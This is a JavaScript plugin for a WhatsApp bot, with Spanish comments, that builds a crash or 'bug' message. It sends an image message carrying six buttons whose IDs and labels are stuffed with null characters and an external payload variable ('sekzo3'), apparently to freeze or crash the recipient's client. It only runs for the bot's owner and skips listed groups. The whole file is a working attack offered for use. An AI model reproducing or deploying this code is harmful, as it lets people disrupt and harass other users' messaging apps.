// plugins/button.js

module.exports = {
    name: 'button',
    alias: [],

    async execute(conn, m, args, context) {
        
        // 1. Extraemos todas las variables necesarias del 'context'
        const { isBot, isCreator, groupid, reply, from, web, sekzo3, fotoJpg } = context;

        // 2. Tu código original, sin ninguna modificación en su lógica
        if (!isBot && !isCreator) return;

        if (m.isGroup && groupid.includes(m.chat)) {
            return reply("❎❎❎❎");
        }

        await conn.sendMessage(from, {
            image: fotoJpg,
            "contextInfo": {
                "externalAdReply": {
                    "title": `𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘`,
                    "body": 'ola',
                    "mediaType": 4,
                    "thumbnail": web,
                    "jpegThumbnail": web,
                    "MediaUrl": 'SEKKKK',
                    "sourceUrl": 'KKKK'
                }
            },
            caption: `☠️⃟⿻Xghr ϟ 𝐕𝟒⿻⃟☠️`,
            footer: `𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 & 𝐌𝐚𝐢𝐤𝐞𝐥`,
            buttons: [
                { buttonId: '\u0000'.repeat(100), buttonText: { displayText: sekzo3 + '\u0000'.repeat(100) }, type: 10 },
                { buttonId: '\u0000'.repeat(100), buttonText: { displayText: sekzo3 + '\u0000'.repeat(100) }, type: 10 },
                { buttonId: '\u0000'.repeat(100), buttonText: { displayText: sekzo3 + '\u0000'.repeat(100) }, type: 10 },
                { buttonId: '\u0000'.repeat(100), buttonText: { displayText: sekzo3 + '\u0000'.repeat(100) }, type: 10 },
                { buttonId: '\u0000'.repeat(100), buttonText: { displayText: sekzo3 + '\u0000'.repeat(100) }, type: 10 },
                { buttonId: '\u0000'.repeat(100), buttonText: { displayText: sekzo3 + '\u0000'.repeat(100) }, type: 10 },
            ],
            headerType: 1,
            viewOnce: true
        });
    }
};